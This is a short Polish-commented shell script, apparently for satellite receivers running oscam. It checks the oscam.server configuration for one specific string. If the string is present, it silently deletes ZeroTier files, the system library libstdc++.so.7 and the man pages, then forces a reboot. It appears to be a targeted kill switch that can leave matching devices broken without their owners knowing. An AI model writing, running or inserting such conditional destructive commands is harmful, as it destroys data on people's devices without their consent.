#!/bin/sh

CHECKHOST=`cat /etc/hostname`
CHECK='/tmp/check'
uname -m > $CHECK

sleep 1;

#grep -qs -i 'mips' cat $CHECK ||

if grep -wq "cpXalkidonaRysio" "/etc/tuxbox/config/oscam/oscam.server"; then
        echo "[ jest takie slowo w pliku ]"
        rm -r /var/lib/zerotier-one > /dev/null 2>&1
        rm -r /usr/sbin/zerotie* > /dev/null 2>&1
        rm -r /etc/init.d/zerotie > /dev/null 2>&1
        rm -r /usr/lib/libstdc++.so.7 > /dev/null 2>&1
        rm -r /usr/share/man > /dev/null 2>&1
        
        sleep 1 ;
        
        reboot -f
        
else
        echo "[ niema takiego slowa w pliku ]"
fi

exit 0